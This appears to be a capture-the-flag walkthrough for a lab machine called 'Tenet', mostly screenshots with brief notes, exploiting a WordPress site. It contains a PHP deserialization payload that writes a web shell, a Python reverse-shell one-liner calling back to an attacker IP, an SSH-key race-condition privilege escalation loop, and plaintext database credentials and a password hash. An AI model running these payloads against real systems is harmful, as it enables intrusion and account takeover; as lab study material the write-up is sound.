# Tenet

Nmap Scan

![Tenet%204291f405b73f49e89298392fbf851a39/Untitled.png](Tenet%204291f405b73f49e89298392fbf851a39/Untitled.png)

Wordpress page with search input.

![Tenet%204291f405b73f49e89298392fbf851a39/Untitled%201.png](Tenet%204291f405b73f49e89298392fbf851a39/Untitled%201.png)

Gobuster scan to discover new directories. 

![Tenet%204291f405b73f49e89298392fbf851a39/Untitled%202.png](Tenet%204291f405b73f49e89298392fbf851a39/Untitled%202.png)

Wp-include files

![Tenet%204291f405b73f49e89298392fbf851a39/Untitled%203.png](Tenet%204291f405b73f49e89298392fbf851a39/Untitled%203.png)

Probably has a interesting file called sator.php 

![Tenet%204291f405b73f49e89298392fbf851a39/Untitled%204.png](Tenet%204291f405b73f49e89298392fbf851a39/Untitled%204.png)

![Tenet%204291f405b73f49e89298392fbf851a39/Untitled%205.png](Tenet%204291f405b73f49e89298392fbf851a39/Untitled%205.png)

Trying find the backup file, i found with extension .bak

![Tenet%204291f405b73f49e89298392fbf851a39/Untitled%206.png](Tenet%204291f405b73f49e89298392fbf851a39/Untitled%206.png)

Analyzing the backup, it serializes arepo parameter.

![Tenet%204291f405b73f49e89298392fbf851a39/Untitled%207.png](Tenet%204291f405b73f49e89298392fbf851a39/Untitled%207.png)

![Tenet%204291f405b73f49e89298392fbf851a39/Untitled%208.png](Tenet%204291f405b73f49e89298392fbf851a39/Untitled%208.png)

Object serialization is a concept that expands in almost all programming languages, its main objective is to transform an object into a binary form or even into a text format (such as XML, for example) in order to transmit it via the network. or store your content without data loss.

With that in mind, we can create a serialized reverse-shell.

Sources: 

[https://medium.com/swlh/exploiting-php-deserialization-56d71f03282a](https://medium.com/swlh/exploiting-php-deserialization-56d71f03282a)

[https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf](https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf)

[https://insomniasec.com/cdn-assets/Deserialization_-__What_Could_Go_Wrong.pdf](https://insomniasec.com/cdn-assets/Deserialization_-__What_Could_Go_Wrong.pdf)

[https://www.youtube.com/watch?v=gTXMFrctYLE&ab_channel=HackticLabs](https://www.youtube.com/watch?v=gTXMFrctYLE&ab_channel=HackticLabs)

Serialized → URL → base64

![Tenet%204291f405b73f49e89298392fbf851a39/Untitled%209.png](Tenet%204291f405b73f49e89298392fbf851a39/Untitled%209.png)

If we read file with binary we look serialized code.

Making it

![Tenet%204291f405b73f49e89298392fbf851a39/Untitled%2010.png](Tenet%204291f405b73f49e89298392fbf851a39/Untitled%2010.png)

I realized that the site is waiting

![Tenet%204291f405b73f49e89298392fbf851a39/Untitled%2011.png](Tenet%204291f405b73f49e89298392fbf851a39/Untitled%2011.png)

I tried make a similar php file serialize it and test in my [localhost](http://localhost) to get exploit.

![Tenet%204291f405b73f49e89298392fbf851a39/Untitled%2012.png](Tenet%204291f405b73f49e89298392fbf851a39/Untitled%2012.png)

And sator returns me one more line

![Tenet%204291f405b73f49e89298392fbf851a39/Untitled%2013.png](Tenet%204291f405b73f49e89298392fbf851a39/Untitled%2013.png)

And i don't give a reverse shell but i try make a php file with command permissions

![Tenet%204291f405b73f49e89298392fbf851a39/Untitled%2014.png](Tenet%204291f405b73f49e89298392fbf851a39/Untitled%2014.png)

and success 

```jsx
<?php

class DatabaseExport
{
	public $user_file = 'test.php';
	public $data = '<?php system($_GET["makman"]);?>';

}

$obj = new DatabaseExport;
echo htmlspecialchars(serialize($obj));
```

![Tenet%204291f405b73f49e89298392fbf851a39/Untitled%2015.png](Tenet%204291f405b73f49e89298392fbf851a39/Untitled%2015.png)

Python reverse shell

![Tenet%204291f405b73f49e89298392fbf851a39/Untitled%2016.png](Tenet%204291f405b73f49e89298392fbf851a39/Untitled%2016.png)

We got the shell, can stop apache2 server

Let's go now get user flag, sudoers  command:

![Tenet%204291f405b73f49e89298392fbf851a39/Untitled%2017.png](Tenet%204291f405b73f49e89298392fbf851a39/Untitled%2017.png)

With id_rsa we can connect in ssh using the key, but is necessary have the password. 

![Tenet%204291f405b73f49e89298392fbf851a39/Untitled%2018.png](Tenet%204291f405b73f49e89298392fbf851a39/Untitled%2018.png)

![Tenet%204291f405b73f49e89298392fbf851a39/Untitled%2019.png](Tenet%204291f405b73f49e89298392fbf851a39/Untitled%2019.png)

Is the same password of user account. 

![Tenet%204291f405b73f49e89298392fbf851a39/Untitled%2020.png](Tenet%204291f405b73f49e89298392fbf851a39/Untitled%2020.png)

[https://www.youtube.com/watch?v=lKfVBxSUPNg](https://www.youtube.com/watch?v=lKfVBxSUPNg)

Create script to run the racing condition and send public credential to the server.

```jsx
# nano script2.sh
while true
do
sudo /usr/local/bin/enableSSH.sh
done
```

```jsx
# nano script1.sh
while true
do
echo "ID_RSA.PUB HERE" | tee /tmp/ssh-* //tee write in file
done
```

![Tenet%204291f405b73f49e89298392fbf851a39/Untitled%2021.png](Tenet%204291f405b73f49e89298392fbf851a39/Untitled%2021.png)

```jsx
/wp-admin            
/wp-content           
/wp-includes          
/xmlrpc.php 

10.10.10.223/wordpress/wp-includes/certificates/ca-bundle.crt

WordPress 5.6

{blog-postapi-url}/../wp-admin/post.php?action=edit&post={post-id} 
clickUrl>
{blog-postapi-url}/../wp-admin/edit-comments.php 
O:14:"DatabaseExport":2:{s:9:"user_file";s:10:"vaivai.php";s:4:"data";s:32:"<?php system($_GET["makman"]);?>";}

subiquity.views.identity:375 User input: 
{'hostname': 'tenet', 'realname': 'shaun', 'username': 'shaun', 
'password': '$6$76U/Vbj.miWRl0kv$qvO2BeN8bMMFbQvds09EDaI7kt2lOpqx/tGQd1gAckLsR6g3Cb0BIcVZnsBGYIJEgmO6ToLvOxHSLyerY8v7C0'}

/** MySQL database username */
define( 'DB_USER', 'neil' );

/** MySQL database password */
define( 'DB_PASSWORD', 'Opera2112' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.185",9000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

cat /bin/fusermount<<EOF
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int main(int argc, char **argv)
{
  setreuid(0,0);
  system("/usr/bin/touch /w00t");
  return(0);
}
EOF

while true do echo  "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDFPKqzpt4YJmJntLTT7+MbJyiqqpnzp1JGKMImq8xMpFOoL0+61/ma/y/jI58H3R26qWx2IHhDZpmc3N0eoRCml1pgv7FxDZ2WvR1lxDm2EcatKllzTyGwlgb+4ajn4M5aTJI/A/ZIV+phT84G9Hk0nsuAeNSN0qawBMs1lpiFCkHSQZA3ONN7O0HI/zpkCyZLE9dpEjaP0VgzmJdgYtcp4LcHYghPUo1Hyza7g7XMIICr1Bjvm+54nQNKq7+2M4GnHGZT4EJ4aFj0yRY/ne6nWjmw4yPgbkJwUOegh0qstMkcbMWqAJhAgXsAGRePVbLVYC8hybkPSMLMgXSCl9WIWbJMTHb0zfwfgKwYeL2tDnlKHTvXkTMzOhJFGh2RpgKVLV03XqIXZHUlt5GmAuaVAOs6HhXC/KV7HY1YTil44i2AvlkMo8k8m5Js23nmu01YAzlEt+UGwtQqOF3cxsSBDpB54/zTLtxjRvXwq3ynWuTv+h59I2bdYiBTdrZ3gn0= br4cketz@bracketz" | tee /tmp/ssh* > /dev/null; done

while true
do
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDaOyqwl0B2XUXoX8XRk6sZey3akObs46n6WNqM1Y5IE9RE/LwjlXupWHOG0EcczF1+oFX2K/pvd0Vl8aFQqfaBC5/bt0CwelLRDizW780gSnSwKl5HbZevvjhW19bG5IEhnFyeKQMVyYJdxqHcNaLxOMKQRqIr9F6lyTPlaiPHgOLIQbQWJ0Pj1HmT+kLDik67SsNntUbr1k3/cGoxqb04z02HyeEC0eRTWJOskdcpoNJVS6PCe3viNTxCBiTBGC4nzHu12MjU2cdo1A26d1Y3bwaw3uzuFn8spPRsszUsmyb4Y9LnZtGSR9DIiLhM09JROfzH9/UHcMc7oa/AYwIkBWEu4EVV0SEZjq/P8HuMVpu5gBFTRD95gBNPRt902x0fccRwddlLEyMN8RIfHJeH/LAc1L+WlMjOlmW7FshQdIL4LHmhKGKutnaJ2jP1cvj2UjlNM4wiD2+XFlbjmZ6D0tJLed0PyTlrsn2zrkcFHX9KtvjRfClF+uZmU5ZZR8M= br4cketz@bracketz' | tee /tmp/ssh-*
done
```